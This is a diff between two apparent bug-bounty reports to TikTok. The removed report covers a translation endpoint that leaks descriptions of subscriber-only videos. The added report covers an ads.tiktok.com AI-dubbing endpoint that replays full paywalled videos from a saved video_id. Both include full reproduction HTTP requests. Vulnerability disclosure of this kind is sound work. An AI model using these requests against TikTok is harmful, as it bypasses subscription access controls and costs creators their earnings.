@@ -1,78 +1,98 @@
-**Program:** Tiktok  **Asset:** tiktok.com  **Weakness:** Information disclosure
+**Program:** Tiktok  **Asset:** ads.tiktok.com  **Weakness:** Improper Access Control
 
-**Title: Unauthorized Access to Subscriber-Only Video Descriptions via Translation Endpoint
+**Title: Attacker can watch full subscription only content for free via Symphony Creative Studio AI-Dubbing Endpoint
 ## Description:
 
-TikTok provides an endpoint intended to translate video descriptions into different languages:
+This report is related to my previously reported issue #3575328 where a TikTok endpoint on (`ads.tiktok.com`) allowed subscriber-only videos to be processed through a remix generation feature after a subscription expired. In that report, the analyst assessed the confidentiality as Low because only the visual portion of the video was exposed while the original audio was replaced.
+<img width="1062" height="202" alt="Screenshot 2026-03-08 171718" src="https://github.com/user-attachments/assets/c61e54ec-0f77-4ac4-843e-0fe9e7001e5e" />
+While continuing to investigate subscriber-only content protections, I discovered a separate endpoint on (ads.tiktok.com) Symphony Creative Studio. Unlike the previous report, this endpoint allows the full original video including audio to be disclosed using only the vid.
+The TikTok Symphony Creative Studio endpoint responsible for video AI-Dubbing generation (`creative_bff_i18n/api/cue/ai_dubbing_new/gen_task/batch_create`) does not revalidate the current authorization state of subscriber-only videos when a `vid` is supplied.
 
-`/aweme/v1/translation/description/`
-
-This endpoint accepts parameters such as `item_id` and `target_lang`.
-
-However, the endpoint does not validate whether the requester has permission to access the underlying video content before performing the translation.
-
-An attacker can supply the `item_id` of a subscriber-only video and request translation into another language (e.g., French). Even when the original description is already in English, the backend processes the request and returns the translated version, thereby exposing the original description.
-
-This results in a bypass of access control protections for subscriber-only content.
-
-
-
+An attacker who was previously subscribed to a paid video can save the `video_id` while they have access, and after their subscription ends, They can still watch the content whenever they want. As a result, this issue exposes the complete original content rather than a modified remix output, allowing subscriber-only videos to be accessed and retained even after the subscription has expired.
 
 ---
 
 ## Steps to Reproduce
-1. Identify a subscriber-only TikTok video.
+1. Subscribe to a subscriber-only video
 
-2. Obtain the public `item_id` of the video.
-
-3. Send the following request (as shown in the image below, if the video description is already english change `target_lang` to any other language like `fr` which is france):
+2. Capture/save its video identifier by running the graph ql request below
 ```
-GET /aweme/v1/translation/description/?WebIdLastTime=1772402811&aid=1988&app_language=en-GB&app_name=tiktok_web&browser_language=en-GB&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&data_collection_enabled=true&device_id=7612412068823090689&device_platform=web_pc&focus_state=true&from_page=user&history_len=6&is_fullscreen=false&is_page_visible=true&item_id=ITEM_ID&odinId=7407740357695439878&os=windows&priority_region=NG&referer=https%3A%2F%2Fwww.tiktok.com%2F&region=NG&root_referer=https%3A%2F%2Fwww.tiktok.com%2F&screen_height=720&screen_width=1280&target_lang=fr&tz_name=Africa%2FLagos&user_is_login=true&verifyFp=verify_mmo21qu3_TcQTwa31_2vrd_4ux7_99Us_cl2gz1Yfe2TI&webcast_language=en-GB HTTP/2
+GET <video_link> HTTP/2
 Host: www.tiktok.com
 Cookie: [redacted]
-Sec-Ch-Ua-Platform: "Windows"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Cache-Control: max-age=0
 Sec-Ch-Ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
 Sec-Ch-Ua-Mobile: ?0
-Accept: */*
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: 
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=0, i
+```
+you should find the video_id in the response as shown in the image below (save it somwhere)
+<img width="928" height="846" alt="image" src="https://github.com/user-attachments/assets/7cc85c99-a488-425a-be22-8ea5e2117220" />
+
+3. Allow the subscription to expire
+4. As the attacker Confirm the video is no longer accessible through normal TikTok interfaces.
+5. now as the attacker go to (https://ads.tiktok.com/creative/creativestudio/create/history) make sure you are signed up to ads.tiktok.com
+6. Now as attacker run the following http request below:
+```
+POST /creative_bff_i18n/api/cue/ai_dubbing_new/gen_task/batch_create?aid=585599&app_name=creative_aio_client&device_platform=web&did=7613122579646088760&device_id=7613122579646088760 HTTP/2
+Host: ads.tiktok.com
+Cookie: [REDACTED]
+Content-Length: 294
+Sec-Ch-Ua-Platform: "Windows"
+X-Csrftoken: J5SgjaVz52jajtNNJMvxGn7BoAaABVhK
+Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Agw-Js-Conv: str
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+X-Creative-Source: cue/dubbing
+Content-Type: application/json
+Origin: https://ads.tiktok.com
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: https://www.tiktok.com/@boymayola/photo/7616504487141739784?lang=en-GB
+Referer: https://ads.tiktok.com/creative/creativestudio/dubbing
 Accept-Encoding: gzip, deflate, br
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Priority: u=1, i
+
+{"cueProjectId":"","project_name":"ANY_NAME","video_id":"SAVED_VIDEO_ID","tasks":[{"project_id":"","target_language":"English","lipsync":false,"task_name":"ANY_NAME","lipsync_model_type":1,"subtitle_erase":false,"source_language":"Auto-detect"}]}
 ```
-<img width="326" height="275" alt="Screenshot 2026-03-22 194753" src="https://github.com/user-attachments/assets/1bf40518-74b4-4baf-97a2-6194d28f75be" />
-4.  Observe that the response returns the translated description of the subscriber-only video.
-
-5. (Optional) Translate the response back to English using any translator to fully understand the content.
-
+7. Now as the attacker go back to (https://ads.tiktok.com/creative/creativestudio/create/history) and Observe that the system is generating the video as shown in the POC below, now while its loading click it (we are clciking it because the system does not eventually generate the dub, it just keeps loading)
+<img width="959" height="451" alt="Screenshot 2026-03-24 030422" src="https://github.com/user-attachments/assets/68846f44-c419-475f-907c-b3ce755f60e1" />
+8. Now when you click it you will see a cover image of the sub-only video. Click it
+<img width="959" height="451" alt="Screenshot 2026-03-24 030332" src="https://github.com/user-attachments/assets/e662e542-012e-45c0-a6ec-699c3d432918" />
+9. Now observe that the full sub-only video starts to play including its audio.
 
 ---
 
 ## Impact
-- Unauthorized users can access subscriber-only video descriptions without subscribing.
-- This may expose:
-  - Exclusive content intended only for subscribers
-  - Promotional or discount codes
-  - Sensitive or private creator information
 
-- Additionally:
-  - If a creator edits the description after a user unsubscribes, the attacker can still retrieve the latest version of the description, resulting in continued information disclosure.
+Subscriber-only TikTok videos are intended to be accessible only while a user has an active subscription. Once the subscription expires, access should be revoked and the content should no longer be viewable.
 
-This vulnerability breaks the confidentiality of TikTok’s subscription-based content model and may lead to financial and privacy impacts for content creators.
+However, this endpoint allows an attacker to use a previously obtained video_id to access the full original video (including audio) through the Symphony Creative Studio dubbing workflow. This bypasses the subscription paywall and exposes content that should no longer be accessible after access revocation.
 
+In practice, this means a user only needs temporary access to the video_id once in order to regain access to the subscriber-only video at any time, even after their subscription has expired.
 
 ---
 
 ## Severity
-**CVSS v3.0 Base Score:** 7.6 → Medium  
+**CVSS v3.0 Base Score:** 5.9 → Medium  
 
 | Metric | Value |
 |--------|-------|
 | Attack Vector (AV) | Network |
-| Attack Complexity (AC) | Low |
+| Attack Complexity (AC) | High |
 | Privileges Required (PR) | None |
 | User Interaction (UI) | None |
 | Scope (S) | Unchanged |
